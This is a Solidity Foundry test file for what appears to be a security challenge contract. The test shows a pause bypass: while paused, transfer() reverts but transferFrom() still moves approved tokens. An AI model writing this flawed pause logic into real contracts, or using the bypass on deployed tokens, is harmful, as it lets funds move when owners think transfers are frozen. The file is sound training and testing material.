// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Challenge04.sol";

contract Challenge04Test is Test {
    Challenge04 token;
    address alice;
    address bob;

    function setUp() public {
        token = new Challenge04();
        alice = vm.addr(1);
        bob = vm.addr(2);

        // Transfer some tokens to Alice
        token.transfer(alice, 1000 ether);

        // From Alice, approve Bob to spend 500 tokens
        vm.prank(alice);
        token.approve(bob, 500 ether);
    }

    function testBypassPauseWithTransferFrom() public {
        // Owner pauses the contract
        token.pause();

        // Attempting transfer() directly should fail
        vm.prank(alice);
        vm.expectRevert("Challenge4: transfers paused");
        token.transfer(bob, 100 ether);

        // Bob uses transferFrom to move funds from Alice to himself
        vm.prank(bob);
        token.transferFrom(alice, bob, 200 ether); // succeeds, bug!

        // Bob received tokens despite the pause
        assertEq(token.balanceOf(bob), 200 ether);
    }
}
